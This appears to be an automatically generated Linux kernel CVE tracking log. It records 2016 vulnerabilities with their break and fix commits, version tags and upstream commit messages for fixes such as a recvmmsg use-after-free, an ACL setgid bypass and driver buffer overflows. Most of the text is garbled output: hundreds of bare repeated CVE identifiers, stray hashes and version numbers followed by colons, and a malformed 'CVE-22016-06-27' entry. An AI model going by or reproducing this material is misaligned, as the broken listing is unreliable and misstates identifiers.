Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
